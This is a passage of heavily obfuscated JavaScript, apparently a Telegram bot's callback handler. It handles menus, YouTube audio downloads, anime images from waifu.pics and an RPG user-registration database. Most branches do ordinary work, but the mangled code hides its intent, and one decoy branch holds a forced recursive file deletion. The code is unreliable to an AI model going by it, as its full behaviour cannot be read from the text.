_0x1791a4[_0x578b4b(0x182)](_0x25d134,_0x3334e2);},'sVCJW':function(_0x9830a0,_0x449570){const _0x1122a2=_0x1c579f;return _0x1791a4[_0x1122a2(0x2fb)](_0x9830a0,_0x449570);},'vFnnV':_0x1791a4[_0x1c579f(0x24e)],'yGmhJ':_0x1c579f(0x305)+'\x20database.'+_0x1c579f(0x360),'clbmJ':_0x1791a4[_0x1c579f(0x291)],'pBdQD':_0x1c579f(0x210)+_0x1c579f(0x2e2)+'up:','yxVWI':_0x1791a4['IMnBD']};action=_0x31b69e['callbackQu'+_0x1c579f(0x37f)][_0x1c579f(0x272)]['split']('\x20'),args=action,user_id=Number(action[0x1]);if(_0x31b69e[_0x1c579f(0x20f)+_0x1c579f(0x37f)][_0x1c579f(0x342)]['id']!=user_id)return _0x31b69e['answerCbQu'+_0x1c579f(0x37f)](_0x1791a4[_0x1c579f(0x3a9)],{'show_alert':!![]});const _0x18dd88=_0x1791a4[_0x1c579f(0x3c2)](_0x51d7f1),_0x44aabf=_0x1791a4['EEWjn'](_0x51d7f1(),_0x18dd88),_0x1549cc=_0x42dde5['getUserNam'+'e'](_0x31b69e[_0x1c579f(0x20f)+_0x1c579f(0x37f)][_0x1c579f(0x342)]),{isUrl:_0x49cc72,fetchJson:_0x1cdd48}=_0x42dde5,_0x660acb=_0x1549cc[_0x1c579f(0x194)],_0x362dac=_0x1549cc[_0x1c579f(0x240)]?_0x1549cc[_0x1c579f(0x240)]:_0x1791a4[_0x1c579f(0x283)],_0xf24853=[_0x31b69e[_0x1c579f(0x256)][_0x1c579f(0x240)],...global[_0x1c579f(0x1ac)]][_0x1c579f(0x361)](_0xdb247=>_0xdb247[_0x1c579f(0x221)](_0x1c579f(0x217)+_0x1c579f(0x3cf),''))[_0x1c579f(0x166)](_0x1549cc[_0x1c579f(0x240)]?_0x1549cc['username']:'-'),_0x1ee691=async _0x48423e=>{const _0x8ff318=_0x1c579f;if(_0x4a21cc[_0x8ff318(0x3dc)](_0x4a21cc[_0x8ff318(0x188)],_0x4a21cc['awBTH']))for(var _0xf06f58 of _0x42dde5['range'](0x0,_0x48423e[_0x8ff318(0x322)],0x1000)){return await _0x31b69e[_0x8ff318(0x1f6)+'arkdown'](_0x48423e[_0x8ff318(0x174)](_0xf06f58,0x1000),{'disable_web_page_preview':!![]});}else return _0x581986[_0x8ff318(0x25b)](_0x46c356),_0x54e90b[_0x8ff318(0x299)][_0x8ff318(0x20c)+'e'](_0x49567a,_0x4a21cc[_0x8ff318(0x1b7)]);},_0x745da5=_0x2424ee[_0x1c579f(0x3ce)](__dirname,_0x1c579f(0x1e6)+_0x1c579f(0x31f)),_0x4e187b=async()=>{const _0x1eec46=_0x1c579f,_0x3c75e3={'MPpSs':_0x1791a4[_0x1eec46(0x316)]};try{const _0x3923a0=_0x5de229[_0x1eec46(0x3bd)+'nc'](_0x745da5,_0x1791a4[_0x1eec46(0x291)]);return JSON[_0x1eec46(0x20d)](_0x3923a0);}catch(_0x1312e7){if(_0x1791a4['KpFsh'](_0x1791a4[_0x1eec46(0x3a0)],_0x1eec46(0x1d0)))try{const _0x71b16a=_0x3037b5[_0x1eec46(0x3bd)+'nc'](_0x4c3881,_0x1eec46(0x2ac));return _0x4d8439[_0x1eec46(0x20d)](_0x71b16a);}catch(_0x2dcdaf){return _0x4c7583[_0x1eec46(0x25b)](_0x3c75e3[_0x1eec46(0x3a7)],_0x2dcdaf),{};}else return console[_0x1eec46(0x25b)](_0x1791a4[_0x1eec46(0x316)],_0x1312e7),{};}},_0x52eeb9=async _0x31e8eb=>{const _0x9fae09=_0x1c579f;try{_0x5de229[_0x9fae09(0x23e)+'ync'](_0x745da5,JSON[_0x9fae09(0x3c4)](_0x31e8eb,null,0x2),'utf-8'),console[_0x9fae09(0x3ab)](_0x4a21cc[_0x9fae09(0x327)]);}catch(_0x39b89f){if(_0x4a21cc[_0x9fae09(0x3fa)]!==_0x4a21cc['CFIFs'])return _0x1e9b1f[_0x9fae09(0x16d)]=![],_0x25b32c[_0x5246bd]['money']=(_0x145829[_0x2db345]['money']||0x0)+0x1f4,_0x462488[_0x3c41c1][_0x9fae09(0x409)]=_0x4a21cc[_0x9fae09(0x3ee)](_0x223740[_0x538a73][_0x9fae09(0x409)]||0x0,0x19),_0x1fe4b3[_0x9fae09(0x20c)+'e'](_0x544ace[_0x9fae09(0x2e8)]['id'],_0x9fae09(0x2f4)+_0x9fae09(0x286)+_0x9fae09(0x1bb));else console['error'](_0x9fae09(0x1f9)+_0x9fae09(0x401)+_0x9fae09(0x16a),_0x39b89f);}};try{switch(action[0x0]){case'menucmd':{if(_0x1791a4[_0x1c579f(0x33a)](_0x1c579f(0x371),_0x1791a4[_0x1c579f(0x1e2)])){let _0x4f27c0;try{_0x4f27c0=await _0x42dde5[_0x1c579f(0x3d6)](_0x1791a4[_0x1c579f(0x1cf)]);}catch{_0x4f27c0={'value':'-'};}hitall=''+(_0x4f27c0[_0x1c579f(0x387)]==undefined?'-':_0x4f27c0['value']);let _0x51f08d=new Date(new Date()+0x36ee80),_0x208ed7=_0x51f08d[_0x1c579f(0x241)+'teString']('en',{'weekday':_0x1791a4[_0x1c579f(0x232)]}),_0x4eb6ca=[_0x1c579f(0x154),_0x1791a4['LuSZu'],_0x1c579f(0x186),'Kliwon',_0x1791a4['AYuHV']][_0x1791a4[_0x1c579f(0x3be)](Math[_0x1c579f(0x17d)](_0x51f08d/0x50ae4c0),0x5)],_0x3ffe71=_0x51f08d['toLocaleDa'+'teString']('en',{'day':'numeric','month':_0x1791a4['xisAd'],'year':_0x1791a4[_0x1c579f(0x399)]}),_0x20200a=Intl[_0x1c579f(0x2bd)+_0x1c579f(0x295)](_0x1791a4[_0x1c579f(0x172)]('en',_0x1791a4['UFSlb']),{'day':_0x1791a4[_0x1c579f(0x399)],'month':_0x1791a4[_0x1c579f(0x232)],'year':_0x1791a4[_0x1c579f(0x399)]})[_0x1c579f(0x18a)](_0x51f08d);lang[_0x1c579f(0x2e5)](_0x31b69e,THUMBNAIL,_0x660acb,OWNER_NAME,OWNER,'/',hitall,_0x44aabf,_0x2c8c9d,_0x42dde5,_0x208ed7,_0x3ffe71,_0x20200a,_0x362dac,_0xf24853,_0x1549cc['id'][_0x1c579f(0x21f)]());}else return _0x595ccc['win']++,_0x20eafb[_0x1c579f(0x16d)]=![],_0x253ede[_0x2d0294][_0x1c579f(0x244)]=_0x4a21cc[_0x1c579f(0x178)](_0x126539[_0x3c49c2][_0x1c579f(0x244)]||0x0,0x5dc),_0x2fd232[_0x1e3d31]['exp']=_0x4a21cc[_0x1c579f(0x229)](_0xb6ca6a[_0x18c104]['exp']||0x0,0x4b),_0x2e9fd1[_0x1c579f(0x20c)+'e'](_0x3e5f54[_0x1c579f(0x2e8)]['id'],'❌\x20Kamu\x20men'+_0x1c579f(0x384)+_0x1c579f(0x2f5)+_0x1c579f(0x3f6));}break;case _0x1c579f(0x2d9):{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x2d9)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4[_0x1c579f(0x1d8)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang['panelcmd'](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4['hQHAT']:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)](),lang[_0x1c579f(0x2ca)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4[_0x1c579f(0x1ec)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang['toolscmd'](_0x31b69e,THUMBNAIL,user_id['toString']());}break;case _0x1791a4[_0x1c579f(0x2da)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x2db)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4[_0x1c579f(0x234)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x3f9)](_0x31b69e,THUMBNAIL,user_id['toString']());}break;case _0x1791a4[_0x1c579f(0x351)]:{if(_0x1791a4[_0x1c579f(0x1ea)](_0x1791a4['TDsUg'],_0x1791a4[_0x1c579f(0x3f2)])){const _0x3537f0=_0x4b7437[_0x1c579f(0x3bd)+'nc'](_0x4d05e0,'utf-8');return _0x308b85[_0x1c579f(0x20d)](_0x3537f0);}else await _0x31b69e['deleteMess'+'age'](),lang['menufun'](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4[_0x1c579f(0x311)]:{await _0x31b69e[_0x1c579f(0x3f5)+'age'](),lang[_0x1c579f(0x1ee)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4[_0x1c579f(0x348)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x28c)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case'downloadcm'+'d':{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x389)+'d'](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case'aicmd':{await _0x31b69e['deleteMess'+_0x1c579f(0x388)](),lang[_0x1c579f(0x22c)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case'ownercmd':{await _0x31b69e['deleteMess'+_0x1c579f(0x388)](),lang[_0x1c579f(0x318)](_0x31b69e,THUMBNAIL,user_id['toString']());}break;case _0x1791a4[_0x1c579f(0x254)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x3aa)](_0x31b69e,THUMBNAIL,user_id[_0x1c579f(0x21f)]());}break;case _0x1791a4['dCmhm']:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),lang[_0x1c579f(0x162)](_0x31b69e,THUMBNAIL,user_id['toString']());}break;case _0x1791a4[_0x1c579f(0x171)]:{_0x1791a4[_0x1c579f(0x288)](_0x1791a4[_0x1c579f(0x2c4)],_0x1c579f(0x1a7))?_0x4d49d0[_0x1c579f(0x3ab)](_0x225326):(await _0x31b69e['deleteMess'+'age'](),await _0x31b69e['sendContac'+'t'](OWNER_NUMBER,OWNER_NAME),_0x1ee691(_0x1c579f(0x24b)+OWNER_NAME+']('+OWNER[0x0]+_0x1c579f(0x3f7)));}break;case _0x1791a4['rqyit']:{if(!args[0x2])return _0x1791a4['Rxevi'](_0x1ee691,'Kirim\x20peri'+_0x1c579f(0x3a4)+_0x1c579f(0x2e7)+'utube\x0a\x0aCon'+_0x1c579f(0x304)+_0x1c579f(0x180)+_0x1c579f(0x346)+_0x1c579f(0x1fa)+_0x1c579f(0x1a2)+'4');if(!_0x49cc72(args[0x2]))return _0x1791a4['Rxevi'](_0x1ee691,_0x1c579f(0x33d)+_0x1c579f(0x3a4)+_0x1c579f(0x30a)+_0x1c579f(0x367)+_0x1c579f(0x304)+'naan:\x0a/ytm'+_0x1c579f(0x3ae)+_0x1c579f(0x1fa)+_0x1c579f(0x1a2)+'4');if(!args[0x2]['includes'](_0x1791a4[_0x1c579f(0x2bb)])&&!args[0x2][_0x1c579f(0x166)](_0x1791a4[_0x1c579f(0x3e3)]))return _0x1791a4['Rxevi'](_0x1ee691,_0x1c579f(0x33d)+'ntah:\x0a/ytm'+_0x1c579f(0x30a)+'utube\x0a\x0aCon'+_0x1c579f(0x304)+_0x1c579f(0x180)+_0x1c579f(0x346)+_0x1c579f(0x1fa)+_0x1c579f(0x1a2)+'4');_0x1791a4[_0x1c579f(0x16f)](_0x1ee691,lang['wait']),await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();let _0x45e31e=await _0x1791a4[_0x1c579f(0x377)](_0xcc19f7,_0x1c579f(0x1a6)+_0x1c579f(0x270)+'rcel.app/d'+_0x1c579f(0x202)+_0x1c579f(0x29e)+args[0x2]);var _0x499ccf=await _0x45e31e[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'udio']({'url':_0x499ccf[_0x1c579f(0x319)],'filename':_0x499ccf[_0x1c579f(0x181)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':'DELETE\x20🚯','callback_data':_0x1791a4[_0x1c579f(0x182)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x230)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();}break;case _0x1791a4[_0x1c579f(0x290)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0xf572fd=await _0xcc19f7(_0x1c579f(0x2ff)+'i.waifu.pi'+'cs/sfw/wai'+'fu'),_0x1ac107=await _0xf572fd[_0x1c579f(0x2fe)]();_0x31b69e['replyWithP'+_0x1c579f(0x39f)]({'url':_0x1ac107[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':'LANJUT\x20📤','callback_data':_0x1791a4['IUrjF']+user_id},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4['uMEit']+user_id}]]}});}break;case _0x1c579f(0x205):{if(_0x1791a4['bBcHM'](_0x1791a4['FhOKr'],'ypxPa')){await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x5958e9=await _0xcc19f7('https://ap'+'i.waifu.pi'+_0x1c579f(0x35c)+'o'),_0x324e10=await _0x5958e9[_0x1c579f(0x2fe)]();_0x31b69e['replyWithP'+'hoto']({'url':_0x324e10[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4['sQryc'],'reply_markup':{'inline_keyboard':[[{'text':'LANJUT\x20📤','callback_data':_0x1791a4[_0x1c579f(0x3d1)]('neko2\x20',user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x237)](_0x1c579f(0x266),user_id)}]]}});}else _0x3e7b0b['rmSync'](_0x2635d5,{'recursive':!![],'force':!![]});}break;case _0x1791a4[_0x1c579f(0x21a)]:{await _0x31b69e[_0x1c579f(0x3f5)+'age']();const _0x113632=await _0x1791a4[_0x1c579f(0x303)](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+'cs/sfw/shi'+_0x1c579f(0x279)),_0x352f7e=await _0x113632['json']();_0x31b69e[_0x1c579f(0x1d9)+_0x1c579f(0x39f)]({'url':_0x352f7e[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x262)](_0x1791a4['FJUfl'],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x262)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1791a4['oFOEJ']:{if(_0x1791a4[_0x1c579f(0x33a)](_0x1791a4['TiiNJ'],_0x1791a4[_0x1c579f(0x2ec)])){const _0x3bc005=user_id,_0x360cc9=await _0x4e187b(),_0x324c75=_0x360cc9[_0x3bc005];if(_0x324c75&&_0x324c75[_0x1c579f(0x2ae)]&&_0x324c75['umur'])return _0x31b69e[_0x1c579f(0x15b)](_0x1c579f(0x3b0)+_0x1c579f(0x1e0)+_0x1c579f(0x3d4)+_0x1c579f(0x403)+_0x1c579f(0x248)+_0x1c579f(0x168)+_0x1c579f(0x1c4)+_0x1c579f(0x3c6)+'bah\x20data.');const _0x4b022e=global[_0x1c579f(0x34c)+'er']?.[_0x3bc005];if(!_0x4b022e)return _0x31b69e[_0x1c579f(0x15b)](_0x1791a4['XoWpN']);return _0x360cc9[_0x3bc005]={'nama':_0x4b022e[_0x1c579f(0x2ae)],'umur':_0x1791a4[_0x1c579f(0x377)](parseInt,_0x4b022e[_0x1c579f(0x27b)]),'exp':0x0,'money':0x0,'level':0x0,'tiketcoin':0x0,'lastbonus':0x0,'tanggaldaftar':new Date()[_0x1c579f(0x1a4)+_0x1c579f(0x313)](_0x1791a4[_0x1c579f(0x213)],{'dateStyle':_0x1791a4[_0x1c579f(0x1b0)],'timeStyle':_0x1791a4['HnHNr']}),'lastkerja':0x0,'lastbansos':0x0,'ojekk':0x0,'lastmisi':0x0,'botol':0x0,'kaleng':0x0,'kardus':0x0,'gelas':0x0,'plastik':0x0,'lastmulung':0x0,'health':0x64,'pickaxe':0x0,'pickaxedurability':0x0,'lastmining':0x0,'trash':0x0,'string':0x0,'rock':0x0,'iron':0x0,'diamond':0x0,'emerald':0x0,'common':0x0,'uncommon':0x0,'mythic':0x0,'legendary':0x0,'gold':0x0,'potion':0x0,'atm':0x0,'bank':0x0,'fullatm':0x3b9aca00,'banteng':0x0,'harimau':0x0,'gajah':0x0,'kambing':0x0,'panda':0x0,'buaya':0x0,'kerbau':0x0,'sapi':0x0,'monyet':0x0,'babihutan':0x0,'babi':0x0,'ayam':0x0,'lastberkebon':0x0,'pisang':0x0,'anggur':0x0,'mangga':0x0,'jeruk':0x0,'apel':0x0,'bibitpisang':0x0,'bibitanggur':0x0,'bibitmangga':0x0,'bibitjeruk':0x0,'bibitapel':0x0,'warn':0x0,'jail':![],'armor':0x0,'armordurability':0x0,'lastclaim':0x0,'wood':0x0,'skill':'','rokets':0x0,'rob':0x0,'lastrob':0x0,'lastmonthly':0x0,'lastojek':0x0},await _0x52eeb9(_0x360cc9),delete global[_0x1c579f(0x34c)+'er'][_0x3bc005],await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)](),_0x31b69e['reply'](_0x1c579f(0x36a)+'ran\x20berhas'+_0x1c579f(0x271)+_0x1c579f(0x3e2)+'*'+_0x4b022e[_0x1c579f(0x2ae)]+('*\x0aTanggal\x20'+_0x1c579f(0x1c1))+_0x360cc9[_0x3bc005][_0x1c579f(0x2a9)+_0x1c579f(0x306)],{'parse_mode':_0x1791a4['VPAae']});}else return _0x1add4f[_0x1c579f(0x2e3)]++,_0xec10f0[_0x1c579f(0x16d)]=![],_0x4061d4[_0x3d631e][_0x1c579f(0x244)]=_0x156d05[_0x1c579f(0x320)](0x0,_0x4a21cc[_0x1c579f(0x2df)](_0x208736[_0x139122][_0x1c579f(0x244)]||0x0,0x2bc)),_0x45dd95[_0x292f2f][_0x1c579f(0x409)]=_0x16d144[_0x1c579f(0x320)](0x0,(_0x3697b3[_0x4ebf4f][_0x1c579f(0x409)]||0x0)-0x1e),_0x3cf4eb[_0x1c579f(0x20c)+'e'](_0x364fcd[_0x1c579f(0x2e8)]['id'],_0x1c579f(0x26d)+_0x1c579f(0x3c8)+_0x1c579f(0x257)+'xp');}break;case _0x1791a4[_0x1c579f(0x366)]:{if(_0x1791a4[_0x1c579f(0x167)](_0x1791a4[_0x1c579f(0x1c9)],_0x1791a4[_0x1c579f(0x1c9)])){await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x1b5c77=await _0x1791a4['YUaLV'](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x3a3)+'umin'),_0x639df1=await _0x1b5c77[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x1d9)+'hoto']({'url':_0x639df1[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x172)]('megumin2\x20',user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}else return _0x444906['reply'](_0x4a21cc[_0x1c579f(0x2ce)]);}break;case _0x1791a4[_0x1c579f(0x2be)]:{if(_0x1791a4[_0x1c579f(0x289)]('EsRYU',_0x1791a4[_0x1c579f(0x31d)]))return _0x52dc2a[_0x1c579f(0x25b)](_0x4a21cc[_0x1c579f(0x1d1)],_0x2c24c4),{};else{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0xfb5282=await _0x1791a4['ecKCx'](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x1ce)+'ly'),_0x49d4da=await _0xfb5282[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x49d4da[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x268)]+user_id},{'text':_0x1c579f(0x32d),'callback_data':_0x1791a4['cUqkx'](_0x1791a4['uMEit'],user_id)}]]}});}}break;case _0x1791a4[_0x1c579f(0x19b)]:{await _0x31b69e['deleteMess'+_0x1c579f(0x388)]();const _0xefd747=await _0x1791a4[_0x1c579f(0x3ad)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x1d5)+'dle'),_0x4ff79d=await _0xefd747[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x4ff79d[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x40b)](_0x1791a4[_0x1c579f(0x175)],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4[_0x1c579f(0x27d)](_0x1c579f(0x266),user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x30d)]:{await _0x31b69e[_0x1c579f(0x3f5)+'age']();const _0x545590=await _0x1791a4[_0x1c579f(0x220)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x1a9)),_0x70f63c=await _0x545590[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x70f63c[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x247)](_0x1791a4[_0x1c579f(0x3bc)],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x336)]+user_id}]]}});}break;case _0x1791a4[_0x1c579f(0x33f)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x435139=await _0x1791a4[_0x1c579f(0x402)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x406)),_0x14f551=await _0x435139[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x14f551[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x192)](_0x1791a4[_0x1c579f(0x325)],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4['SRdht'](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x339)]:{if(_0x1791a4[_0x1c579f(0x1bd)](_0x1791a4['OTakf'],_0x1791a4[_0x1c579f(0x170)]))_0x5d43fb[_0x1c579f(0x25b)](_0x1c579f(0x1f9)+_0x1c579f(0x401)+_0x1c579f(0x16a),_0x16eae4);else{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x3b1567=await _0xcc19f7(_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x3e5)+'o'),_0x50cea3=await _0x3b1567[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x1d9)+_0x1c579f(0x39f)]({'url':_0x50cea3[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x247)](_0x1791a4[_0x1c579f(0x280)],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4['MlmOV'](_0x1c579f(0x266),user_id)}]]}});}}break;case _0x1791a4['sfPlP']:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x335661=await _0xcc19f7(_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x329)+'s'),_0x5b5e69=await _0x335661[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x5b5e69['url']},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x27d)](_0x1791a4['pVMUy'],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x247)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1c579f(0x2b9):{await _0x31b69e['deleteMess'+'age']();const _0x2ed46a=await _0x1791a4[_0x1c579f(0x3ad)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x294)+'k'),_0x4fd433=await _0x2ed46a[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x4fd433[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4[_0x1c579f(0x30c)],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x182)](_0x1c579f(0x2b0),user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4[_0x1c579f(0x262)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1791a4[_0x1c579f(0x25c)]:{await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x252a80=await _0xcc19f7(_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+'cs/sfw/pat'),_0x166f49=await _0x252a80[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0x166f49[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1791a4['sQryc'],'reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4['XFglc'](_0x1791a4['iUIvE'],user_id)},{'text':_0x1791a4[_0x1c579f(0x161)],'callback_data':_0x1791a4[_0x1c579f(0x262)](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}break;case _0x1791a4['bpbDM']:{if(_0x1791a4[_0x1c579f(0x16e)](_0x1791a4[_0x1c579f(0x18d)],_0x1791a4['ziOPT'])){await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x4ac278=await _0x1791a4[_0x1c579f(0x16f)](_0xcc19f7,'https://ap'+_0x1c579f(0x3ac)+_0x1c579f(0x3df)+'g'),_0x2afacf=await _0x4ac278[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+'nimation']({'url':_0x2afacf[_0x1c579f(0x1e8)]},{'caption':lang['ok'],'parse_mode':_0x1c579f(0x2ba),'reply_markup':{'inline_keyboard':[[{'text':_0x1c579f(0x18b),'callback_data':_0x1791a4[_0x1c579f(0x27d)](_0x1791a4[_0x1c579f(0x3c3)],user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4['XFglc'](_0x1791a4['uMEit'],user_id)}]]}});}else _0x4b62e9['writeFileS'+_0x1c579f(0x1be)](_0x1550a6,_0x4692cb[_0x1c579f(0x3c4)](_0x1be7be,null,0x2),_0x4a21cc[_0x1c579f(0x250)]),_0x3914b0[_0x1c579f(0x3ab)](_0x4a21cc[_0x1c579f(0x327)]);}break;case _0x1791a4[_0x1c579f(0x347)]:{if(_0x1791a4[_0x1c579f(0x167)](_0x1791a4[_0x1c579f(0x3e8)],_0x1791a4[_0x1c579f(0x3e8)])){await _0x31b69e[_0x1c579f(0x3f5)+_0x1c579f(0x388)]();const _0x1f89f1=await _0x1791a4[_0x1c579f(0x35b)](_0xcc19f7,_0x1c579f(0x2ff)+_0x1c579f(0x3ac)+_0x1c579f(0x15c)+'k'),_0xfe429e=await _0x1f89f1[_0x1c579f(0x2fe)]();_0x31b69e[_0x1c579f(0x2d4)+_0x1c579f(0x32f)]({'url':_0xfe429e['url']},{'caption':lang['ok'],'parse_mode':'MARKDOWN','reply_markup':{'inline_keyboard':[[{'text':_0x1791a4[_0x1c579f(0x1b9)],'callback_data':_0x1791a4[_0x1c579f(0x172)](_0x1c579f(0x204),user_id)},{'text':_0x1791a4['jrIkp'],'callback_data':_0x1791a4['FJqMC'](_0x1791a4[_0x1c579f(0x336)],user_id)}]]}});}else 